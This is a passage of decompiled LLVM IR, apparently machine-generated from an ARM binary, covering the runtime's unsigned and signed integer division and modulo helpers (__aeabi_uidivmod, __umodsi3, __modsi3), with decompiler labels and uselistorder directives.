bb102:                                            ; preds = %bb101
  %v2_14ce8 = add nsw i32 %v1_14ce8, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_14cf0 = phi i32 [ %v1_14ce8, %.thread17 ], [ %v1_14ce8, %bb101 ], [ %v2_14ce8, %bb102 ]
  %v5_14cf4 = phi i32 [ %v1_14ce4, %.thread17 ], [ %v4_14ce4, %bb101 ], [ %v4_14ce4, %bb102 ]
  %v2_14cec = icmp ugt i32 %v5_14cf4, 3
  %v7_14cec = icmp eq i32 %v5_14cf4, 4
  %v2_14cf0 = xor i1 %v7_14cec, true
  %v3_14cf0 = and i1 %v2_14cec, %v2_14cf0
  br i1 %v3_14cf0, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_14cf0 = add nsw i32 %v4_14cf0, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_14cf4 = phi i32 [ %v4_14cf0, %.thread18 ], [ %v5_14cf0, %bb103 ]
  %v2_14cf4 = xor i1 %v2_14cec, true
  %v3_14cf4 = or i1 %v7_14cec, %v2_14cf4
  br i1 %v3_14cf4, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_14cf4 = udiv i32 %v5_14cf4, 2
  %v9_14cf4 = add i32 %v4_14cf4, %v8_14cf4
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_14cf8 = phi i32 [ %v4_14cf4, %bb104 ], [ %v9_14cf4, %bb105 ]
  %v6_14cf8 = lshr i32 %v0_14c24, %v1_14cf8
  ret i32 %v6_14cf8

dec_label_pc_14d00:                               ; preds = %bb80
  %v0_14d00 = load i32, i32* @lr, align 4
  %v0_14d04 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14d00)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14cf4, { 1, 0 }
  uselistorder i1 %v7_14cec, { 1, 0 }
  uselistorder i32 %v4_14ce4, { 1, 0 }
  uselistorder i32 %v1_14ce4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14cd8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14cd8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14cc8, { 1, 0 }
  uselistorder i32 %v0_14ca0, { 1, 0 }
  uselistorder i32 %v4_14c94, { 1, 0 }
  uselistorder i32 %v1_14c9c, { 1, 2, 0 }
  uselistorder i32 %v4_14c88, { 1, 0 }
  uselistorder i32 %v1_14c90, { 1, 2, 0 }
  uselistorder i32 %v4_14c7c, { 1, 0 }
  uselistorder i32 %v1_14c84, { 1, 2, 0 }
  uselistorder i32 %v1_14ca8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14c78, { 1, 0 }
  uselistorder i32 %v1_14ca4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14c64, { 1, 0 }
  uselistorder i32 %v3_14c60, { 1, 0 }
  uselistorder i32 %v1_14c60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_14c64, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14c50, { 1, 0 }
  uselistorder i32 %v4_14c4c, { 2, 1, 0 }
  uselistorder i32 %v1_14c50, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14c58.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_14c24, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 43, 2, 3, 4, 5, 6, 10, 11, 12, 71, 72, 73, 74, 63, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 13, 14, 91, 92, 93, 44, 62, 8, 9, 61, 7, 94, 26, 25, 50, 56, 51, 57, 48, 55, 49, 60, 95, 15, 96, 97, 16, 17, 18, 98, 64, 65, 19, 20, 99, 66, 67, 21, 22, 100, 68, 69, 23, 24, 47, 101, 102, 58, 103, 27, 52, 28, 29, 45, 30, 46, 31, 32, 33, 104, 105, 106, 107, 53, 108, 109, 110, 111, 112, 113, 114, 115, 38, 116, 39, 40, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 37, 131, 132, 133, 134, 135, 136, 36, 137, 42, 138, 54, 59, 41, 139, 34, 35, 70, 140 }
  uselistorder i32 15, { 12, 13, 3, 0, 25, 4, 5, 6, 7, 8, 9, 10, 14, 15, 11, 16, 17, 18, 19, 1, 20, 21, 22, 23, 2, 24 }
  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 15, 16, 17, 18, 459, 460, 19, 20, 21, 22, 23, 24, 25, 461, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 38, 39, 43, 42, 41, 44, 454, 462, 49, 45, 48, 46, 47, 450, 50, 51, 52, 53, 455, 54, 55, 56, 57, 58, 456, 59, 60, 61, 62, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 77, 78, 76, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 94, 96, 97, 98, 102, 108, 103, 99, 104, 109, 105, 110, 106, 100, 111, 101, 112, 113, 107, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 125, 126, 124, 127, 130, 131, 129, 128, 132, 135, 134, 133, 142, 139, 136, 137, 143, 140, 144, 141, 145, 138, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 163, 162, 164, 165, 166, 177, 172, 167, 178, 173, 174, 179, 175, 168, 169, 170, 180, 181, 182, 183, 176, 171, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 196, 195, 197, 198, 199, 200, 201, 202, 203, 205, 204, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 218, 217, 226, 222, 219, 223, 227, 224, 228, 225, 220, 221, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 247, 246, 245, 253, 248, 259, 260, 254, 249, 261, 262, 255, 250, 263, 256, 257, 264, 258, 265, 251, 266, 252, 267, 268, 269, 270, 271, 272, 273, 276, 277, 280, 278, 274, 281, 279, 275, 284, 283, 282, 287, 288, 285, 289, 286, 290, 295, 293, 296, 294, 291, 292, 297, 451, 457, 298, 299, 300, 301, 305, 302, 303, 304, 307, 308, 306, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 324, 325, 328, 326, 322, 329, 327, 323, 332, 331, 330, 335, 336, 333, 337, 334, 338, 343, 341, 344, 342, 339, 340, 345, 452, 458, 346, 347, 348, 349, 353, 350, 351, 352, 355, 356, 354, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 372, 371, 373, 374, 376, 375, 377, 378, 379, 380, 383, 390, 384, 385, 381, 386, 387, 388, 382, 391, 389, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 405, 404, 406, 407, 408, 412, 419, 413, 414, 420, 415, 409, 410, 416, 411, 417, 421, 418, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 435, 434, 436, 437, 438, 439, 441, 440, 442, 443, 444, 445, 446, 449, 453, 463, 447, 448 }
  uselistorder i32 128, { 14, 15, 16, 28, 2, 29, 17, 18, 19, 20, 24, 3, 22, 4, 23, 5, 12, 13, 25, 26, 27, 7, 0, 1, 8, 9, 10, 30, 6, 31, 21, 11 }
  uselistorder i32 255, { 14, 16, 2, 18, 3, 19, 4, 20, 0, 1, 7, 21, 8, 22, 5, 23, 6, 24, 11, 25, 12, 26, 9, 27, 10, 28, 15, 17, 13, 29 }
  uselistorder i32 65536, { 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 21, 1, 22, 0, 2, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 38, 39, 40, 41, 34, 35, 36, 37, 42, 45, 46, 47, 43, 44, 48, 49, 50, 51, 52, 53, 55, 54, 56, 3, 57, 59, 60, 58, 61, 4, 62, 64, 65, 63, 66, 67, 70, 71, 72, 68, 69, 73, 74, 75, 76, 77, 111, 79, 78, 112, 80, 81, 83, 82, 85, 84, 113, 87, 86, 114, 88, 89, 91, 90, 93, 92, 94, 5, 95, 98, 99, 100, 96, 97, 101, 6, 102, 106, 107, 108, 103, 104, 105, 110, 109 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder i32 65535, { 103, 54, 0, 1, 13, 55, 28, 56, 27, 57, 26, 58, 14, 15, 2, 30, 59, 29, 60, 61, 16, 62, 3, 31, 63, 32, 64, 33, 65, 66, 4, 34, 67, 68, 5, 35, 69, 70, 17, 71, 6, 39, 72, 36, 73, 37, 74, 38, 75, 76, 18, 77, 7, 78, 79, 43, 80, 42, 81, 40, 82, 41, 83, 19, 20, 8, 84, 44, 85, 45, 86, 21, 22, 9, 87, 46, 88, 47, 89, 90, 91, 23, 92, 93, 10, 50, 94, 48, 95, 49, 96, 97, 24, 98, 11, 12, 53, 99, 51, 100, 52, 101, 25, 102 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_14cb0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14c6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c58thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14d14 = udiv i32 %arg1, %arg2
  ret i32 %v2_14d14
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14d28 = add i32 %arg2, -1
  %v2_14d28 = icmp eq i32 %arg2, 0
  br i1 %v2_14d28, label %dec_label_pc_14de4, label %dec_label_pc_14d30

dec_label_pc_14d30:                               ; preds = %entry
  %v7_14d28 = icmp eq i32 %arg2, 1
  br i1 %v7_14d28, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_14d30
  %v1_14d30 = load i32, i32* @r0, align 4
  %v10_14d30 = icmp eq i32 %v1_14d30, %arg2
  br i1 %v10_14d30, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_14d30, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_14d30 = icmp ult i32 %v1_14d30, %arg2
  br i1 %v4_14d30, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_14d38 = and i32 %v1_14d28, %arg2
  %v8_14d38 = icmp eq i32 %v6_14d38, 0
  br i1 %v8_14d38, label %.thread67, label %dec_label_pc_14d48.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_14d3c = phi i32 [ %v1_14d30, %bb75 ], [ 0, %.thread65 ]
  %v3_14d3c = and i32 %v1_14d3c, %v1_14d28
  br label %bb76

dec_label_pc_14d48.preheader:                     ; preds = %bb75
  %v2_14d4899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_14d4899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_14dd8, %bb74, %bb89, %bb84, %dec_label_pc_14da8, %.thread67
  %v5_14d40 = phi i32 [ %v1_14d30, %bb74 ], [ %v3_14d3c, %.thread67 ], [ %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, %dec_label_pc_14da8 ], [ 0, %bb84 ], [ %v1_14ddc, %dec_label_pc_14dd8 ], [ %v2_14dd8, %bb89 ]
  ret i32 %v5_14d40

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_14d48.preheader
  %v0_14d5c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_14d48.preheader ], [ %v4_14d50, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_14d48.preheader ], [ %v2_14d5411, %.thread1.thread9 ]
  br label %dec_label_pc_14d5cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_14d48.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_14d5411, %.thread1.thread9 ], [ 0, %dec_label_pc_14d48.preheader ]
  %v0_14d5c.pr33100 = phi i32 [ %v4_14d50, %.thread1.thread9 ], [ %arg2, %dec_label_pc_14d48.preheader ]
  %v4_14d4c = icmp ult i32 %v0_14d5c.pr33100, %v1_14d30
  br i1 %v4_14d4c, label %bb78, label %dec_label_pc_14d5cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_14d50 = and i32 %v0_14d5c.pr33100, 268435456
  %v3_14d50 = icmp eq i32 %v2_14d50, 0
  %v4_14d50 = mul i32 %v0_14d5c.pr33100, 16
  br i1 %v3_14d50, label %.thread1.thread9, label %dec_label_pc_14d5c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_14d5411 = add i32 %storemerge101, 4
  %v2_14d48 = icmp ugt i32 %v4_14d50, 268435455
  br i1 %v2_14d48, label %.thread, label %bb77

dec_label_pc_14d5cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_14d5cthread-pre-split.loopexit

dec_label_pc_14d5cthread-pre-split.loopexit:      ; preds = %dec_label_pc_14d5cthread-pre-split.loopexit.loopexit, %.thread
  %v0_14d5c.pr3398 = phi i32 [ %v0_14d5c.pr33.lcssa, %.thread ], [ %v0_14d5c.pr33100, %dec_label_pc_14d5cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_14d5cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14d5cthread-pre-split

dec_label_pc_14d5cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_14d5cthread-pre-split.loopexit
  %v1_14d6839 = phi i32 [ %storemerge95, %dec_label_pc_14d5cthread-pre-split.loopexit ], [ %v2_14d68, %.thread4 ]
  %v0_14d5c.pr = phi i32 [ %v0_14d5c.pr3398, %dec_label_pc_14d5cthread-pre-split.loopexit ], [ %v3_14d64, %.thread4 ]
  br label %dec_label_pc_14d5c

dec_label_pc_14d5c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_14d5c

dec_label_pc_14d5c:                               ; preds = %dec_label_pc_14d5c.loopexit, %dec_label_pc_14d5cthread-pre-split
  %v0_14d70.pr = phi i32 [ %v1_14d6839, %dec_label_pc_14d5cthread-pre-split ], [ %storemerge101, %dec_label_pc_14d5c.loopexit ]
  %v1_14d64 = phi i32 [ %v0_14d5c.pr, %dec_label_pc_14d5cthread-pre-split ], [ %v4_14d50, %dec_label_pc_14d5c.loopexit ]
  %v2_14d5c = icmp slt i32 %v1_14d64, 0
  br i1 %v2_14d5c, label %dec_label_pc_14d70, label %bb79

bb79:                                             ; preds = %dec_label_pc_14d5c
  %v4_14d60 = icmp ult i32 %v1_14d64, %v1_14d30
  br i1 %v4_14d60, label %.thread4, label %dec_label_pc_14d70

.thread4:                                         ; preds = %bb79
  %v3_14d64 = mul i32 %v1_14d64, 2
  %v2_14d68 = add i32 %v0_14d70.pr, 1
  br label %dec_label_pc_14d5cthread-pre-split

dec_label_pc_14d70:                               ; preds = %bb79, %dec_label_pc_14d5c
  %v2_14d70 = add i32 %v0_14d70.pr, -3
  %v5_14d74 = icmp slt i32 %v0_14d70.pr, 3
  br i1 %v5_14d74, label %dec_label_pc_14db4, label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d70, %bb83
  %v6_14da0 = phi i32 [ %v0_14da8, %bb83 ], [ %v2_14d70, %dec_label_pc_14d70 ]
  %v1_14d7c = phi i32 [ %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, %bb83 ], [ %v1_14d30, %dec_label_pc_14d70 ]
  %v3_14d9c12 = phi i32 [ %v3_14d9c, %bb83 ], [ %v1_14d64, %dec_label_pc_14d70 ]
  %v3_14d78 = icmp ult i32 %v1_14d7c, %v3_14d9c12
  %v3_14d7c = select i1 %v3_14d78, i32 0, i32 %v3_14d9c12
  %v1_14d84 = sub i32 %v1_14d7c, %v3_14d7c
  %v4_14d80 = udiv i32 %v3_14d9c12, 2
  %v6_14d80 = icmp ult i32 %v1_14d84, %v4_14d80
  %v6_14d84 = select i1 %v6_14d80, i32 0, i32 %v4_14d80
  %v1_14d84.v6_14d84 = sub i32 %v1_14d84, %v6_14d84
  %.demorgan = and i1 %v3_14d78, %v6_14d80
  %v4_14d88 = udiv i32 %v3_14d9c12, 4
  %v6_14d88 = icmp ult i32 %v1_14d84.v6_14d84, %v4_14d88
  %v6_14d8c = select i1 %v6_14d88, i32 0, i32 %v4_14d88
  %v1_14d84.v6_14d84.v6_14d8c = sub i32 %v1_14d84.v6_14d84, %v6_14d8c
  %.demorgan71 = and i1 %.demorgan, %v6_14d88
  %v4_14d90 = udiv i32 %v3_14d9c12, 8
  %v6_14d90 = icmp ult i32 %v1_14d84.v6_14d84.v6_14d8c, %v4_14d90
  %v6_14d94 = select i1 %v6_14d90, i32 0, i32 %v4_14d90
  %v1_14d84.v6_14d84.v6_14d8c.v6_14d94 = sub i32 %v1_14d84.v6_14d84.v6_14d8c, %v6_14d94
  %.demorgan72 = and i1 %.demorgan71, %v6_14d90
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_14d78
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_14d78, %bb80
  %v2_14d98 = add i32 %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, -1
  %v4_14d98 = sub i32 0, %v1_14d84.v6_14d84.v6_14d8c.v6_14d94
  %v5_14d98 = and i32 %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, %v4_14d98
  %v3_14d9c = udiv i32 %v3_14d9c12, 16
  %v5_14da0 = icmp slt i32 %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, 1
  br i1 %v5_14da0, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_14da0 = add i32 %v6_14da0, -4
  %v9_14da0 = sub i32 3, %v6_14da0
  %v10_14da0 = and i32 %v9_14da0, %v6_14da0
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_14da8 = phi i32 [ %v6_14da0, %bb81 ], [ %v7_14da0, %bb82 ]
  %v0_14da415.in = phi i32 [ %v2_14d98, %bb81 ], [ %v7_14da0, %bb82 ]
  %v1_14da414.in = phi i32 [ %v5_14d98, %bb81 ], [ %v10_14da0, %bb82 ]
  %v1_14da414 = icmp slt i32 %v1_14da414.in, 0
  %v0_14da415 = icmp slt i32 %v0_14da415.in, 0
  %v2_14da4 = xor i1 %v0_14da415, %v1_14da414
  br i1 %v2_14da4, label %dec_label_pc_14da8, label %dec_label_pc_14d78

dec_label_pc_14da8:                               ; preds = %bb83
  %v1_14da8 = urem i32 %v0_14da8, 4
  %v2_14da8 = icmp eq i32 %v1_14da8, 0
  br i1 %v2_14da8, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_14da8
  %v3_14dac = icmp eq i32 %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, 0
  br i1 %v3_14dac, label %bb76, label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %bb84, %dec_label_pc_14d70
  %v0_14dc8 = phi i32 [ %v3_14d9c, %bb84 ], [ %v1_14d64, %dec_label_pc_14d70 ]
  %v1_14dc4 = phi i32 [ %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, %bb84 ], [ %v1_14d30, %dec_label_pc_14d70 ]
  %v0_14db4 = phi i32 [ %v0_14da8, %bb84 ], [ %v2_14d70, %dec_label_pc_14d70 ]
  %v5_14db8 = icmp slt i32 %v0_14db4, -2
  br i1 %v5_14db8, label %dec_label_pc_14dd8, label %dec_label_pc_14dbc

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14db4
  %v8_14db4 = icmp eq i32 %v0_14db4, -2
  br i1 %v8_14db4, label %dec_label_pc_14dcc, label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14dbc
  %v3_14dc0 = icmp ult i32 %v1_14dc4, %v0_14dc8
  br i1 %v3_14dc0, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_14dc0
  %v2_14dc0 = sub i32 %v1_14dc4, %v0_14dc8
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_14dc0, %bb85
  %v0_14dcc52 = phi i32 [ %v1_14dc4, %dec_label_pc_14dc0 ], [ %v2_14dc0, %bb85 ]
  %v3_14dc8 = udiv i32 %v0_14dc8, 2
  br label %dec_label_pc_14dcc

dec_label_pc_14dcc:                               ; preds = %dec_label_pc_14dbc, %bb86
  %v0_14dd4 = phi i32 [ %v0_14dc8, %dec_label_pc_14dbc ], [ %v3_14dc8, %bb86 ]
  %v1_14dd0 = phi i32 [ %v1_14dc4, %dec_label_pc_14dbc ], [ %v0_14dcc52, %bb86 ]
  %v3_14dcc = icmp ult i32 %v1_14dd0, %v0_14dd4
  br i1 %v3_14dcc, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_14dcc
  %v2_14dcc = sub i32 %v1_14dd0, %v0_14dd4
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_14dcc, %bb87
  %v0_14dd855 = phi i32 [ %v1_14dd0, %dec_label_pc_14dcc ], [ %v2_14dcc, %bb87 ]
  %v3_14dd4 = udiv i32 %v0_14dd4, 2
  br label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14db4, %bb88
  %v2_14ddc = phi i32 [ %v0_14dc8, %dec_label_pc_14db4 ], [ %v3_14dd4, %bb88 ]
  %v1_14ddc = phi i32 [ %v1_14dc4, %dec_label_pc_14db4 ], [ %v0_14dd855, %bb88 ]
  %v3_14dd8 = icmp ult i32 %v1_14ddc, %v2_14ddc
  br i1 %v3_14dd8, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_14dd8
  %v2_14dd8 = sub i32 %v1_14ddc, %v2_14ddc
  br label %bb76

dec_label_pc_14de4:                               ; preds = %entry
  %v0_14de4 = load i32, i32* @lr, align 4
  %v0_14de8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14de4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14ddc, { 1, 2, 0 }
  uselistorder i32 %v0_14dc8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14da8, { 1, 0, 2 }
  uselistorder i32 %v7_14da0, { 1, 0 }
  uselistorder i32 %v3_14d9c, { 1, 0 }
  uselistorder i32 %v1_14d84.v6_14d84.v6_14d8c.v6_14d94, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_14d90, { 1, 0 }
  uselistorder i32 %v4_14d88, { 1, 0 }
  uselistorder i32 %v4_14d80, { 1, 0 }
  uselistorder i32 %v6_14da0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_14d70, { 1, 0 }
  uselistorder i32 %v1_14d64, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_14d50, { 1, 0, 3, 2 }
  uselistorder i32 %v0_14d5c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14d30, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_14dd8, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_14dcc, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_14d78, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_14df4 = icmp eq i32 %arg2, 0
  br i1 %v2_14df4, label %dec_label_pc_14ec8, label %dec_label_pc_14dfc

dec_label_pc_14dfc:                               ; preds = %entry
  %v1_14df4 = icmp slt i32 %arg2, 0
  br i1 %v1_14df4, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_14dfc
  %v2_14dfc = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14dfc, %bb
  %v4_14e14 = phi i32 [ %arg2, %dec_label_pc_14dfc ], [ %v2_14dfc, %bb ]
  %v0_14e00 = load i32, i32* @r0, align 4
  %v1_14e00 = icmp slt i32 %v0_14e00, 0
  br i1 %v1_14e00, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_14e04 = sub i32 0, %v0_14e00
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_14e0c = phi i32 [ %v0_14e00, %bb79 ], [ %v2_14e04, %bb80 ]
  %v1_14e08 = add i32 %v4_14e14, -1
  %v7_14e08 = icmp eq i32 %v4_14e14, 1
  br i1 %v7_14e08, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_14e0c = icmp eq i32 %v1_14e0c, %v4_14e14
  br i1 %v10_14e0c, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_14e0c = icmp ult i32 %v1_14e0c, %v4_14e14
  br i1 %v4_14e0c, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_14e14 = and i32 %v1_14e08, %v4_14e14
  %v8_14e14 = icmp eq i32 %v6_14e14, 0
  br i1 %v8_14e14, label %.thread72, label %dec_label_pc_14e24.preheader

dec_label_pc_14e24.preheader:                     ; preds = %bb84
  %v2_14e24109 = icmp ugt i32 %v4_14e14, 268435455
  br i1 %v2_14e24109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_14e1864 = phi i32 [ %v1_14e0c, %bb84 ], [ 0, %.thread70 ]
  %v3_14e18 = and i32 %v1_14e1864, %v1_14e08
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_14e24.preheader
  %v0_14e38.pr35.lcssa = phi i32 [ %v4_14e14, %dec_label_pc_14e24.preheader ], [ %v4_14e2c, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_14e24.preheader ], [ %v2_14e309, %.thread2.thread7 ]
  br label %dec_label_pc_14e38thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_14e24.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_14e309, %.thread2.thread7 ], [ 0, %dec_label_pc_14e24.preheader ]
  %v0_14e38.pr35110 = phi i32 [ %v4_14e2c, %.thread2.thread7 ], [ %v4_14e14, %dec_label_pc_14e24.preheader ]
  %v4_14e28 = icmp ult i32 %v0_14e38.pr35110, %v1_14e0c
  br i1 %v4_14e28, label %bb86, label %dec_label_pc_14e38thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_14e2c = and i32 %v0_14e38.pr35110, 268435456
  %v3_14e2c = icmp eq i32 %v2_14e2c, 0
  %v4_14e2c = mul i32 %v0_14e38.pr35110, 16
  br i1 %v3_14e2c, label %.thread2.thread7, label %dec_label_pc_14e38.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_14e309 = add i32 %storemerge111, 4
  %v2_14e24 = icmp ugt i32 %v4_14e2c, 268435455
  br i1 %v2_14e24, label %.thread1, label %bb85

dec_label_pc_14e38thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_14e38thread-pre-split.loopexit

dec_label_pc_14e38thread-pre-split.loopexit:      ; preds = %dec_label_pc_14e38thread-pre-split.loopexit.loopexit, %.thread1
  %v0_14e38.pr35108 = phi i32 [ %v0_14e38.pr35.lcssa, %.thread1 ], [ %v0_14e38.pr35110, %dec_label_pc_14e38thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_14e38thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14e38thread-pre-split:               ; preds = %.thread4, %dec_label_pc_14e38thread-pre-split.loopexit
  %v1_14e4441 = phi i32 [ %storemerge105, %dec_label_pc_14e38thread-pre-split.loopexit ], [ %v2_14e44, %.thread4 ]
  %v2_14e3c36 = phi i32 [ %v1_14e0c, %dec_label_pc_14e38thread-pre-split.loopexit ], [ %v2_14e3c, %.thread4 ]
  %v0_14e38.pr = phi i32 [ %v0_14e38.pr35108, %dec_label_pc_14e38thread-pre-split.loopexit ], [ %v3_14e40, %.thread4 ]
  br label %dec_label_pc_14e38

dec_label_pc_14e38.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e38.loopexit, %dec_label_pc_14e38thread-pre-split
  %v0_14e4c.pr = phi i32 [ %v1_14e4441, %dec_label_pc_14e38thread-pre-split ], [ %storemerge111, %dec_label_pc_14e38.loopexit ]
  %v2_14e3c = phi i32 [ %v2_14e3c36, %dec_label_pc_14e38thread-pre-split ], [ %v1_14e0c, %dec_label_pc_14e38.loopexit ]
